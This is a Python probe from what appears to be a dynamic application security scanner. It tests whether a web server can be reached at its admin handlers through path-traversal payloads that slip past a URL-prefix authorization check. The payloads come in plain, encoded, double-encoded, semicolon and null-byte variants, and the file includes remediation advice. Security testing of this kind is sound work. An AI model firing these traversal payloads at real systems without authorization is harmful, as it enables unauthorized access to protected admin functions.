#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization: path-traversal escapes the routing prefix to reach
admin-only resources.

Some servers compare the URL prefix (e.g. `/api/users/`) against the
caller's role BEFORE normalizing `..` segments. A request like
`/api/users/1/../../admin` then satisfies the "starts with
/api/users/" gate, gets normalized further down the pipeline, and is
served by the admin handler.

Variations the probe tries (each represents a real bypass class):
  - Plain `..`
  - URL-encoded `..%2f` (catches naive prefix-string compares)
  - Double-encoded `..%252f` (catches single-pass decoders)
  - Tomcat-style `..;/` (path-parameter abuse)
  - Null-byte `..%00/` (catches C-string truncation in older stacks)

High-fidelity gate: we declare validated=True only when ALL THREE
of the following are observed for the same encoding variant:
  1. The traversal request returns 200 with a non-trivial body.
  2. The returned body contains an admin-distinctive token (the
     admin path itself in the response, an admin-only header, or a
     known admin-page string like "Admin Panel" / "Administration"
     / a user-list table).
  3. The exact admin path WITHOUT the traversal prefix returns
     401 / 403 / 302-to-login / 404 — proving the admin handler is
     normally protected and we just walked around the gate.

Detection signal:
  encoded-traversal request returns 200 + admin-shaped body, AND the
  bare admin path returns 401/403/redirect-to-login/404.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# The "outer" route used to satisfy a naive prefix gate. Any of
# these is plausible on a typical REST API. The probe only needs ONE
# of the inner traversal segments to succeed to call the bug.
PREFIX_PATHS = (
    "/api/users/1",
    "/api/profile",
    "/user/profile",
    "/api/orders/1",
)

# The protected admin path we try to reach. Real apps use various
# names; we test the most common ones in turn.
ADMIN_PATHS = (
    "/admin",
    "/api/admin",
    "/admin/users",
    "/api/admin/users",
)

# Encoding variants to try. The mapping is (label, separator-token-
# used-in-path). Each one expresses the SAME logical traversal but
# triggers different pre-normalization parsers.
TRAVERSAL_VARIANTS = (
    ("plain",        "/../../"),
    ("url-encoded",  "/..%2f..%2f"),
    ("double-encoded", "/..%252f..%252f"),
    ("semi",         "/..;/..;/"),
    ("null-byte",    "/..%00/..%00/"),
)

# Distinctive admin-page tokens. We require an exact match of one of
# these in the response body to call the response "admin-shaped".
# Using anchored, multi-word phrases keeps false-positive risk low —
# a generic word like "admin" alone is too noisy.
ADMIN_BODY_RE = re.compile(
    r"(?i)("
    r"\bAdministration Panel\b"
    r"|\bAdministrator Panel\b"
    r"|\bAdmin Dashboard\b"
    r"|\bUser Administration\b"
    r"|\bManage Users\b"
    r"|<title>\s*Admin\b"
    r"|\"role\"\s*:\s*\"admin\""
    r"|spring\.boot\.admin"
    r")"
)


def _is_blocked_status(status: int) -> bool:
    """A status that proves the admin path is normally protected."""
    return status in (401, 403, 404) or (300 <= status < 400)


class PathTraversalToAdminProbe(Probe):
    name = "authz_path_traversal_to_admin"
    summary = ("Detects path-traversal that escapes a routing prefix "
               "to reach admin-only handlers.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--admin-path", action="append", default=[],
            help="Additional admin path to try as the traversal target.")
        parser.add_argument(
            "--prefix-path", action="append", default=[],
            help="Additional outer prefix path (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        admin_paths = list(ADMIN_PATHS) + list(args.admin_path or [])
        prefix_paths = list(PREFIX_PATHS) + list(args.prefix_path or [])

        # Phase 1 — confirm at least one admin path is normally gated.
        # If every candidate admin path is open already (200), this
        # probe is the wrong tool; refute and let other probes (e.g.
        # info_admin_login_at_common_paths) flag the open admin.
        admin_baseline: dict | None = None
        admin_attempts: list[dict] = []
        for ap in admin_paths:
            r = client.request("GET", urljoin(origin, ap),
                               follow_redirects=False)
            row = {"admin_path": ap, "status": r.status, "size": r.size}
            admin_attempts.append(row)
            if _is_blocked_status(r.status):
                # Found one that's normally locked down; remember it
                # for the comparison step.
                admin_baseline = {"admin_path": ap,
                                   "blocked_status": r.status}
                break

        if not admin_baseline:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: no admin path on {origin} appears "
                         "gated; cannot demonstrate traversal-bypass "
                         "without a normally-protected target."),
                evidence={"origin": origin,
                           "admin_baseline_attempts": admin_attempts},
            )

        admin_target = admin_baseline["admin_path"].lstrip("/")
        # Phase 2 — combine each prefix with each traversal variant
        # and the admin target. Stop on the first 3-way match.
        traversal_attempts: list[dict] = []
        confirmed: dict | None = None
        for prefix in prefix_paths:
            if confirmed:
                break
            for label, sep in TRAVERSAL_VARIANTS:
                # Build the traversal URL by concatenation rather than
                # urljoin so encoded slashes survive intact.
                path = prefix.rstrip("/") + sep + admin_target
                full = origin + (path if path.startswith("/")
                                 else "/" + path)
                r = client.request("GET", full, follow_redirects=False)
                row = {"prefix": prefix, "encoding": label,
                       "url": full, "status": r.status, "size": r.size}
                if r.status == 200 and r.body:
                    snippet = (r.text or "")[:600]
                    m = ADMIN_BODY_RE.search(r.text or "")
                    if m:
                        row["admin_marker"] = m.group(0)
                        row["snippet"] = snippet
                        confirmed = row
                        traversal_attempts.append(row)
                        break
                traversal_attempts.append(row)

        evidence = {"origin": origin,
                    "admin_baseline": admin_baseline,
                    "admin_baseline_attempts": admin_attempts,
                    "traversal_attempts": traversal_attempts}

        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: path-traversal authz bypass on "
                         f"{origin} — `{confirmed['url']}` "
                         f"({confirmed['encoding']} variant) returned "
                         f"200 with admin-shaped body "
                         f"(`{confirmed['admin_marker']}`) while the "
                         f"bare admin path "
                         f"`{admin_baseline['admin_path']}` returns "
                         f"{admin_baseline['blocked_status']}."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Normalize the URL path BEFORE the authorization "
                    "decision is made. Concretely:\n"
                    "  - Reject any incoming request whose decoded "
                    "path contains `..`, encoded-slash sequences, or "
                    "path parameters before routing.\n"
                    "  - Apply role checks to the matched route "
                    "handler, not to the URL prefix.\n"
                    "  - In Spring/Servlet stacks, set "
                    "`StrictHttpFirewall` to forbid `;`, `%2f`, "
                    "`%5c`. In Apache/nginx, set `AllowEncodedSlashes "
                    "Off` and `merge_slashes on`.\n"
                    "  - Add an integration test that asserts the "
                    "traversal payloads in this probe return 4xx."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested "
                     f"{len(traversal_attempts)} traversal variants "
                     f"to reach `{admin_baseline['admin_path']}` on "
                     f"{origin}; none returned 200 with admin-shaped "
                     "content."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PathTraversalToAdminProbe().main()
